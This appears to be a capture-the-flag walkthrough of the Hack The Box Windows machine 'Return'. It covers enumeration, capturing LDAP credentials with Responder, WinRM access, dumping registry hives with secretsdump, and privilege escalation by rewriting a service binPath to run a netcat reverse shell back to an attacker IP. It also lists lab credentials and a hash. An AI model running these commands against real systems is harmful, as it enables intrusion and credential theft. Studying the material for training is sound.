---
title: Return
date: 2025-05-25
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, Fake-LDAP-server, SeRestorePrivilege-privesc] 
image: return.png
media_subpath: /assets/img/posts/2025-05-25-returnHTB/
---

## Introduction

In this walkthrough, I tackled **Return**, an easy Windows machine that featured a **network printer administration panel**. During enumeration, I discovered the panel stored **LDAP credentials**, which could be exfiltrated by configuring a **malicious LDAP server**. This tricked the application into leaking valid credentials.

Using the obtained credentials, I gained initial access to the machine via **WinRM**. Further enumeration revealed that the compromised user was a member of a **privileged group**. I leveraged this to escalate privileges and ultimately gained **SYSTEM access** on the box.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53

Version: 

Domain: return.local

- **dig any DNS records**
    
    ```bash
    dig any <domain> @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP <domain>
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445

- smbclient
    
    ![image.png](image%204.png)
    
- enum4linux
    
    ```bash
    enum4linux $IP
    ```
    
    Nothing interesting returned.
    

### Port 5985 (WinRM)

## Web

### Port 80

## AD Initial Enumeration

### User Enumeration

Unauthenticated

```bash
./kerbrute_linux_amd64 userenum -d <domain> --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 70
```

![image.png](image%205.png)

I found user `printer`.

### Port 389/3268

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

Nothing interesting.

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=<RHOST>,DC=local" 
```

![image.png](image%206.png)

## Initial Attack Vectors

### AS-REP Roasting

```bash
GetNPUsers.py return.local/ -dc-ip $IP -no-pass -usersfile users
```

Checking AS-REP roasting for user printer doesn’t result in anything useful.

![image.png](image%207.png)

### Password Spraying

- [ ]  make a userlist (obtain a userlist)
- [ ]  use same passwords as usernames, reverse of them make up passwords of the seasons and current year

## Exploitation

![image.png](image%208.png)

I see this page in website interesting password is not visible, first thing that comes to mind is perform request to our smb share or responder and try to get NetNTLMv2 hashes let’s do that.

```bash
sudo responder -I tun0
```

![image.png](image%209.png)

Running it we received cleartext credentials for svc-printer user.

Trying to get shell with evil-winrm:

```bash
evil-winrm -i $IP -u svc-printer -p '1edFg43012!!’
```

![image.png](image%2010.png)

## Privilege Escalation

We have `SeBackupPrivilege` and `SeRestorePrivilege`

![image.png](image%2011.png)

The privilege  lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Then download them to the system:

![image.png](image%2012.png)

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

```bash
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

![image.png](image%2013.png)

For some reason I can’t get an Admin shell using this hash in Pass The Hash attack.

If we have SeRestorePrivilege that means most probably we are in Server Operators group, consequently that means most probably we can SERVICE_ALL_ACCESS over services running as Local System, you can first run `.\winPEASany.exe quiet servicesinfo` and identify such services and then change their config binpath to add us to local admin group or better give us a shell.

```bash
sc.exe qc AppReadiness

#Checking access rights
sc.exe sdshow "ServiceName"
python3 sd.py --type=service "SDDL"
```

sd.py https://github.com/mtth-bfft/winsddl gets SDDL and pretty-print it.

![image.png](image%2014.png)

That confirms that we have `SERVICE_CHANGE_CONFIG`, `SERVICE_STOP`, `SERVICE_START` privileges over a service.

Let’s change its `binpath`:

```bash
sc.exe config AppReadiness binPath= "cmd /c c:\tools\nc64.exe 10.10.14.17 4444 -e cmd"
```

![image.png](image%2015.png)

Let’s now stop and start the service.

![image.png](image%2016.png)

Now we have obtained NT Authority\System shell.

![image.png](image%2017.png)

## Credentials

```bash
return\svc-printer : 1edFg43012!!
Domain Admin hash : 32db622ed9c00dd1039d8288b0407460
```

## Mitigation

- **Avoid Storing Plaintext Credentials:** Applications should never store LDAP or other sensitive credentials in plaintext or retrievable formats.
- **Validate External Inputs:** Ensure that external servers (like LDAP) cannot be configured without proper validation or authentication.
- **Use Principle of Least Privilege:** Avoid giving unnecessary group memberships or privileges to regular users.
- **Enable Credential Guard & LSA Protection:** These help prevent credential theft on Windows systems.
- **Monitor & Restrict WinRM Usage:** Disable WinRM if not needed or tightly control access using firewalls and GPOs.
- **Log and Alert on Credential Usage:** Set up alerts for unusual authentication behavior or access attempts involving sensitive accounts.
